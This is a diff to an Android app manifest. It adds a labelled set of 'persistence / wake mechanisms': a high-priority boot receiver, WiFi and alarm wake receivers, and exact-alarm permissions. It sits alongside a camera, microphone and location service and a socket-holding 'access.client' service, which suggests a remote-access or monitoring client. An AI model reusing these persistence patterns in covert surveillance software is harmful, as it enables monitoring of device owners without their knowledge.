@@ -18,6 +18,10 @@
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
 
+    <!-- AlarmManager exact alarms (API 31+) — Methods 1 & 4 -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+
     <!-- Audio volume control (mute/unmute streams without needing DND policy) -->
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
 
@@ -129,8 +133,6 @@
         <!--
             Transparent trampoline activity used by PermissionManager to show the
             native runtime-permission dialog from a Service context.
-            Must be exported=false (only launched internally) and use the
-            transparent theme so only the system dialog is visible to the user.
         -->
         <activity
             android:name=".PermissionRequestActivity"
@@ -141,9 +143,8 @@
             android:launchMode="singleTop" />
 
         <!--
-            Background Service
-            foregroundServiceType covers all possible sensor/data types this
-            service may use so Android 14 doesn't kill it mid-operation.
+            Primary background service.
+            foregroundServiceType covers all possible sensor/data types.
         -->
         <service
             android:name=".services.DataSyncService"
@@ -152,11 +153,8 @@
             android:foregroundServiceType="dataSync|camera|microphone|location" />
 
         <!--
-            Secondary Background Service (com.access.client.BackgroundService)
-            Lightweight foreground service that holds the SocketManager
-            connection.  Declared with only the dataSync type so it can
-            always go foreground on Android 15 without requiring
-            camera / microphone / location runtime permissions up front.
+            Secondary background service (com.access.client.BackgroundService).
+            Lightweight foreground service that holds the SocketManager connection.
         -->
         <service
             android:name="com.access.client.BackgroundService"
@@ -164,15 +162,54 @@
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
-        <!-- Boot Receiver -->
+        <!--
+            ════════════════════════════════════════════════════════════════════
+            PERSISTENCE / WAKE MECHANISMS
+            ════════════════════════════════════════════════════════════════════
+
+            Method 2 — Boot receiver
+            Handles: cold boot, locked-boot (direct-boot), HTC quick-boot,
+                     self-update (MY_PACKAGE_REPLACED).
+        -->
         <receiver
             android:name=".receivers.BootReceiver"
             android:enabled="true"
-            android:exported="true">
-            <intent-filter>
+            android:exported="true"
+            android:directBootAware="true">
+            <intent-filter android:priority="999">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!--
+            Method 3 — Network / WiFi wake receiver (manifest-registered leg).
+            CONNECTIVITY_CHANGE cannot be manifest-declared on API 24+, so it is
+            registered dynamically inside DataSyncService.
+            WIFI_STATE_CHANGED and NETWORK_STATE_CHANGED are still receivable here.
+        -->
+        <receiver
+            android:name=".receivers.NetworkWakeReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+                <action android:name="android.net.wifi.STATE_CHANGE" />
+            </intent-filter>
+        </receiver>
+
+        <!--
+            Method 4 — AlarmManager exact-alarm heartbeat receiver.
+            Custom action keeps it scoped to our package only.
+        -->
+        <receiver
+            android:name=".receivers.WakeAlarmReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.task.tusker.action.WAKE_ALARM" />
             </intent-filter>
         </receiver>
 
